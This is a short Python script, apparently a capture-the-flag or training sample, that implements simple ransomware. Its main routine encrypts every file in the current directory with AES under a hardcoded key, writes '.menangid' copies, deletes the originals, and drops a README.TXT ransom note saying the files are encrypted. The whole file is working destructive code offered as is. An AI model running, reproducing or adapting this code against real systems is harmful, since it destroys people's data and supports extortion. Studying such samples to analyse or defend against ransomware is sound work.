#!/usr/bin/python3

import hashlib
import glob
import os
from Crypto import Random
from Crypto.Cipher import AES

class Ransom():

    def __init__(self, key): 
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()
        self.iv = Random.new().read(AES.block_size)

    def encrypt_file(self, name):
        raw = open(name, 'rb').read()
        cipher = self.encrypt(raw)
        out = open(name + '.menangid', 'wb').write(cipher)
        os.remove(name)

    def encrypt(self, raw):
        raw = self._pad(raw)
        cipher = AES.new(self.key, AES.MODE_OFB, self.iv)
        return b'MENANGID_' + cipher.encrypt(raw)

    def gen_readme(self):
        readme = open('README.TXT', 'w')
        readme.write('Oopps, all of your important files are encrypted !\n')
        readme.write('If you want to get your data back, please menangid di pojokan\n')
        readme.close()
        fread = open('README.TXT', 'r').read()
        print(fread)

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * bytes(chr(self.bs - len(s) % self.bs).encode('utf-8'))

def main():
    key = 'ini_jelas_kuncinya_palsu'
    ransom = Ransom(key)
    file_scan = glob.glob('*')
    enc_file_scan = glob.glob('*.menangid')

    for i in file_scan:
        if i == 'ransom.py' or i in enc_file_scan or i == 'README.TXT' or os.path.isfile(i) == False:
            continue
        else:
            ransom.encrypt_file(i)

    ransom.gen_readme()

if __name__ == '__main__':
    main()